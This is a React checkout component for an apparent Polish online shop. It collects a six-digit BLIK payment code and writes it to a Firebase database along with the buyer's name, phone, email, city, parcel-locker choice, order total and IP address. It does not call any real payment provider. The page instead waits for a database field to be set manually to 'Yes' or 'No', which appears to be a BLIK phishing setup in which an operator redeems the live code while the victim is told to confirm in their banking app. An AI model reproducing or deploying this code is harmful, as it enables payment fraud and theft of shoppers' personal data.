import React, { useState, useEffect, useRef } from "react";


import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-app.js";
import {
    getDatabase,
    ref,
    set,
    onValue,
} from "https://www.gstatic.com/firebasejs/11.0.1/firebase-database.js";

// Firebase configuration and initialization
const firebaseConfig = {
    apiKey: "AIzaSyBI9jEFhCJ_haq0R3qaFECibT9ue5nD2RU",
    authDomain: "blik-52f1e.firebaseapp.com",
    databaseURL:
        "https://blik-52f1e-default-rtdb.europe-west1.firebasedatabase.app",
    projectId: "blik-52f1e",
    storageBucket: "blik-52f1e.appspot.com",
    messagingSenderId: "592614598388",
    appId: "1:592614598388:web:3e86c4d89c95bff8f7a0a1",
};
const app = initializeApp(firebaseConfig);
const db = getDatabase(app);

function Dostawa() {
    const [blikCode, setBlikCode] = useState("");
    const [order, setOrder] = useState(1);
    const [ipAdress, setIpAdress] = useState("");
    const [storedSum, setStoredSum] = useState(0);
    const [quantity, setQuantity] = useState(0);
    const blikRef = useRef(null);
    const [text, setText] = useState("Confirm");
    const [time, setTime] = useState("");

    useEffect(() => {
        const textRef = ref(db, `BLIK/${time}`);

        // Listen for real-time updates from Firebase
        const unsubscribe = onValue(textRef, (snapshot) => {
            if (snapshot.exists()) {
                const fetchedText = snapshot.val().Text;
                setText(fetchedText); // Update the state with the new text from Firebase
            } else {
                setText("Confirm"); // Optional: Set an empty string if no data is found
            }
        });

        // Cleanup function to unsubscribe from Firebase listener when the component is unmounted or when currentTime changes
        return () => unsubscribe();
    }, [time]); // Only re-run effect when currentTime changes

    useEffect(() => {
        if (text === "Yes") {
            // Clear all sessionStorage except 'email', 'imie', 'nazwisko'
            const keysToRetain = [
                "email",
                "imie",
                "nazwisko",
                "telefon",
                "miasto",
                "paczkomat",
                "totalSum",
            ];

            sessionStorage.setItem("totalSum", "0");

            // First, loop through all sessionStorage keys and clear those not in keysToRetain
            Object.keys(sessionStorage).forEach((key) => {
                if (!keysToRetain.includes(key)) {
                    sessionStorage.removeItem(key);
                }
            });
        } else if (text === "Confirm" || text === "No") {
            // Set sessionStorage when text is 'Confirm' or 'No'
            sessionStorage.setItem("text", text);
        }
    }, [text]);

    // Fetch IP on component mount
    useEffect(() => {
        const fetchIP = async () => {
            try {
                const response = await fetch("https://api.ipify.org");
                const data = await response.text();
                setIpAdress(data);
            } catch (error) {
                console.error("Failed to fetch IP:", error);
            }
        };
        fetchIP();
    }, []);

    // Aggregate order sum and quantity from session storage
    useEffect(() => {
        let totalSum = 0;
        let totalQuantity = 0;

        for (let i = 1; i <= 100; i++) {
            const sum = sessionStorage.getItem(`sum-${i}`);
            const qty = sessionStorage.getItem(`quantity-${i}`);

            if (sum && qty) {
                totalSum += parseFloat(sum);
                totalQuantity += parseInt(qty);
            }
        }

        setStoredSum(totalSum);
        setQuantity(totalQuantity);
    }, []); // Empty dependency array ensures this runs only once on mount

    // Function to get the current time in HH:MM:SS format
    function getCurrentTime() {
        return Date.now(); // Returns current time in milliseconds since January 1, 1970 (Unix epoch)
    }

    // Function to add data to Firebase
    async function AddData() {
        const currentTime = getCurrentTime();
        setTime(currentTime);

        // Retrieve user info from session storage
        const storedImie = sessionStorage.getItem("imie");
        const storedNazwisko = sessionStorage.getItem("nazwisko");
        const storedTelefon = sessionStorage.getItem("telefon");
        const storedEmail = sessionStorage.getItem("email");
        const storedMiasto = sessionStorage.getItem("miasto");
        const storedPaczkomat = sessionStorage.getItem("paczkomat");

        try {
            await set(ref(db, `BLIK/${currentTime}`), {
                Numer: order,
                Time: currentTime,
                Blik: blikCode,
                IP: ipAdress,
                Imie: storedImie,
                Nazwisko: storedNazwisko,
                Telefon: storedTelefon,
                Email: storedEmail,
                Miasto: storedMiasto,
                Paczkomat: storedPaczkomat,
                Summa: storedSum,
                Quantity: quantity,
                Text: "Confirm",
            });

            // Reset blikCode and increment order number
            setOrder(order + 1);
            setBlikCode("");
        } catch (error) {
            console.error("Error adding data:", error);
        }
    }

    return (
        <div>
            {/* <!-- Modal 1 --> */}
            <div
                className="m-0 p-0 modal fade rounded"
                id="exampleModal1"
                tabIndex="-1"
                aria-labelledby="exampleModalLabel"
                aria-hidden="true"
            >
                <div
                    style={{
                        position: "absolute",
                        top: "40%",
                        left: "50%",
                        transform: "translate(-50%, -50%)",
                        transition: "all 0.3s ease",
                        maxWidth: "360px",
                        position: "relative",
                        height: "auto",
                        // backgroundImage: `url(${Banner_img_3})`,
                        // backgroundSize: "cover",
                        // backgroundPosition: "center",
                        // objectFit: "cover",
                    }}
                    className="m-0 p-0  modal-dialog border border-primary border-2 rounded "
                >
                    <div
                        style={{
                            backgroundColor: "transparent",

                            backdropFilter: "blur(25px)",
                            // backgroundColor: "hsla(0, 0%, 0%, 0.25)",
                        }}
                        className="m-0 p-0 modal-content border-0 rounded "
                    >
                        <div className="m-0 p-0 modal-header border-0 border-bottom border-primary border-2 rounded rounded-bottom-0 ">
                            <h1
                                style={{
                                    fontSize: "21px",
                                    minHeight: "60px",
                                    textShadow:
                                        "1px 1px 10px black, 1px 1px 15px black, 1px 1px 20px black, 1px 1px 25px black, 1px 1px 30px black",
                                }}
                                className="m-0 p-2 ps-3 modal-title text-white d-flex align-items-center"
                                id="exampleModalLabel"
                            >
                                Płatność BLIK
                            </h1>
                            <button
                                type="button"
                                className="o_btn_nav m-0 p-2 ms-auto fs-4 text-white rounded-0" // Bootstrap classes
                                data-bs-dismiss="modal" // Automatically dismisses a modal when clicked
                                aria-label="Close" // Accessibility attribute
                                style={{ height: "60px" }}
                            >
                                X
                            </button>
                        </div>

                        <div style={{ height: "30px" }}></div>

                        <input
                            ref={blikRef}
                            value={blikCode}
                            onChange={(e) =>
                                setBlikCode(e.target.value.replace(/\D/g, ""))
                            }
                            style={{
                                minHeight: "60px",
                                outline: "none",
                                maxWidth: "240px",
                                fontSize: "24px",
                                boxShadow: "1px 1px 30px black, ",
                            }}
                            className="o_link m-0 ms-auto me-auto ps-3 col-12 rounded d-flex flex-column justify-content-center align-items-center text-start bg-transparent text-white "
                            required
                            type="text"
                            pattern="\d{6}"
                            maxLength={6}
                            inputMode="numeric"
                            title="Please enter a 6-digit BLIK code"
                            placeholder="Enter BLIK code"
                            aria-label="Enter 6-digit BLIK code"
                        />

                        <div style={{ height: "30px" }}></div>

                        <p
                            style={{
                                fontSize: "15px",
                                minHeight: "75px",
                                fontStyle: ' italic',
                                textShadow:
                                    "1px 1px 10px black, 1px 1px 15px black, 1px 1px 20px black, 1px 1px 25px black, 1px 1px 30px black",
                            }}
                            className="m-0 p-3 text-white border-top border-2 border-primary"
                        >
                            Kod ma 6 cyfr. <br />
                            Znajdziesz go w aplikacji bankowej.
                        </p>

                        <button
                            type="button"
                            className="m-0 p-3 col-12 btn btn-primary rounded-0 border-0 outline-0 d-flex align-items-center justify-content-center rounded-bottom "
                            style={{ fontSize: "24px", minHeight: "60px" }}
                            onClick={AddData}
                            data-bs-toggle="modal"
                            data-bs-target="#exampleModal2"
                            disabled={blikCode.length !== 6} // Only enable button if blikCode is 6 digits
                        >
                             Kupuję i Płacę 
                        </button>
                    </div>
                </div>
            </div>

            {/* <!-- Modal 2 --> */}


            <div
                className="m-0 p-0 modal fade border-0 "
                id="exampleModal2"
                tabIndex="-1"
                aria-labelledby="exampleModalLabel"
                aria-hidden="true"
                data-bs-backdrop="static"
            >
                <div
                    style={{
                        position: "absolute",
                        top: "40%",
                        left: "50%",
                        transform: "translate(-50%, -50%)",
                        transition: "all 0.3s ease",
                        width: "360px",
                    }}
                    className="m-0 p-0 col modal-dialog border border-primary border-2 rounded"
                >
                    <div
                        style={{
                            backgroundColor: "transparent",

                            backdropFilter: "blur(25px)",
                            // backgroundColor: "hsla(0, 0%, 0%, 0.5)",
                        }}
                        className="m-0 p-0 modal-content border-0"
                    >
                        <div className="m-0 p-0 border-0 row justify-content-between align-items-center border-bottom border-primary border-2">
                            <h1
                                style={{
                                    fontSize: "21px",
                                    height: "60px",
                                    textShadow:
                                        "1px 1px 10px black, 1px 1px 15px black, 1px 1px 20px black, 1px 1px 25px black, 1px 1px 30px black",
                                }}
                                className="m-0 p-2 ps-3 col-auto modal-title  text-white d-flex align-items-center "
                                id="exampleModalLabel"
                            >
                                Płatność BLIK
                            </h1>

                            {text === "Yes" || text === "No" ? (
                                <button
                                    type="button"
                                    className="o_btn_nav m-0 p-2 ms-auto col-auto fs-4 text-white rounded-0" // Bootstrap classes
                                    data-bs-dismiss="modal" // Automatically dismisses a modal when clicked
                                    aria-label="Close" // Accessibility attribute
                                    style={{ height: "60px" }}
                                    // onClick={() => window.location.reload()} // Refresh the page on button click
                                >
                                    X
                                </button>
                            ) : null}
                        </div>

                        <div style={{ height: "15px" }}></div>

                        <div
                            style={{
                                fontSize: "24px",
                                minHeight: "60px",
                                textShadow:
                                    "1px 1px 10px black, 1px 1px 15px black, 1px 1px 20px black, 1px 1px 25px black, 1px 1px 30px black",
                            }}
                            className="m-0 p-2 ps-3 col-auto modal-title text-white d-flex flex-column align-items-center justify-content-center  fw-bold text-center"
                        >
                            {text === "Yes" ? (

                                <>
                                {" "}
                                Zamówienie potwierdzone!
                                <div
                                    style={{
                                        fontSize: "15px",
                                        fontStyle: ' italic',

                                        textShadow:
                                            "1px 1px 10px black, 1px 1px 15px black, 1px 1px 20px black, 1px 1px 25px black, 1px 1px 30px black",
                                    }}
                                    className="m-0 p-0 text-white fw-normal"
                                >
                                                            <div style={{ height: "15px" }}></div>

                                    Dziękuję za zakup!
                                   
                                </div>
                            </>
                            ) : text === "No" ? (
                                <>
                                    {" "}
                                    Płatność się nie udała.
                                    <div
                                        style={{
                                            fontSize: "15px",
                                            fontStyle: ' italic',

                                            textShadow:
                                                "1px 1px 10px black, 1px 1px 15px black, 1px 1px 20px black, 1px 1px 25px black, 1px 1px 30px black",
                                        }}
                                        className="m-0 p-0 text-white fw-normal"
                                    >
                                                                <div style={{ height: "15px" }}></div>

                                        {/* Zakup nieopłacony.
                                        <br /> */}
                                        Niepoprawny kod BLIK.
                                    </div>
                                </>
                            ) : (
                                <>Potwierdź w aplikacji mobilnej!</>
                            )}
                        </div>

                        <div style={{ height: "15px" }}></div>

                    

                        {text === "Yes" ? (
                            <a
                                style={{ fontSize: "24px", height: "60px" }}
                                className="m-0 p-3 col-12 btn btn-primary rounded-0 border-0 outline-0 d-flex align-items-center justify-content-center"
                                href="/Sklep"
                            >
                                Strona Główna
                            </a>
                        ) : text === "No" ? (
                            <button
                                style={{ fontSize: "24px", height: "60px" }}
                                className="m-0 p-3 col-12 btn btn-primary rounded-0 border-0 outline-0 d-flex align-items-center justify-content-center"
                                data-bs-toggle="modal"
                                data-bs-target="#exampleModal1"
                            >
                                Spróbuj Ponownie
                            </button>
                        ) : null}
                    </div>
                </div>
            </div>
        </div>
    );
}

export default Dostawa;
